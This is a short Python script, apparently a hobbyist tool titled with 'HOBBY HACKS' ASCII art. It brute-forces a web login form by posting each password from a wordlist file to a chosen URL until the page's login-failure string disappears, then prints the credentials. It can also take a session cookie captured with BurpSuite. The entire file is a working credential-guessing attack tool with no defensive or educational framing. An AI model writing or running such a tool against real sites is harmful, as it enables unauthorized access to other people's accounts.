import requests

#Define default values
url = "https://www.example.com"
username = "admin"
password_file = "./passwords.txt"
login_failed_string = "Login failed"
request_type = "POST"
username_field = "username"
password_field = "password"
button_name = "Login"
cookie_value = ""

def cracking(username, url):
  for line in f:
        password = line.strip()
        if cookie_value != "":
          response = requests.get(url, data={str(username_field):username, str(password_field):password, str(button_name):"submit"}, cookies={"Cookie":cookie_value})
        else:   
          response = requests.post(url, data={str(username_field):username, str(password_field):password, str(button_name):"Login"})
        
        content = response.content.decode('utf-8')

        if login_failed_string not in content:
            print(f"[+] Found Username: {username}")
            print(f"[+] Found Password: {password}")
            exit()

def ascii_art():
  print('HH   HH   OOOO   BBBB   BBBB   YY   YY')
  print('HH   HH  OO  OO  BB  B  BB  B   YY YY ')
  print('HHHHHHH  OO  OO  BBBB   BBBB     YYY  ')
  print('HH   HH  OO  OO  BB  B  BB  B    YYY ')
  print('HH   HH   OOOO   BBBB   BBBB     YYY  ')
  print('')
  print('HH   HH   AAAA   CCCCC  KK  KK  SSSSS')
  print('HH   HH  AA  AA  CC     KK KK   SS     ')
  print('HHHHHHH AAAAAAA  CC     KKK     SSSSS ')
  print('HH   HH AA   AA  CC     KK KK      SS ')
  print('HH   HH AA   AA  CCCCC  KK  KK  SSSSS  ')

if __name__ == "__main__":
    ascii_art()
    url = input("[+] Enter URL: ")
    username = input("[+] Enter Username For Account To Bruteforce: ")
    password_file = input("[+] Enter Password File To Use: ")
    login_failed_string = input("[+] Enter String That Occurs When Login Fails: ")
    request_type = input("[+] Enter The Request Type (GET/POST): ")
    username_field = input("[+] Enter name of username field: ")
    password_field = input("[+] Enter name of password field: ")
    button_name = input("[+] Enter name of submit button: ")
    # Use BurpSuite to find the cookie value
    cookie_value = input("[+] Enter Cookie Value If Within Session (Optional): ")

    with open(password_file, "r") as f:
        cracking(username, url)
    print("Password did not match any in the list")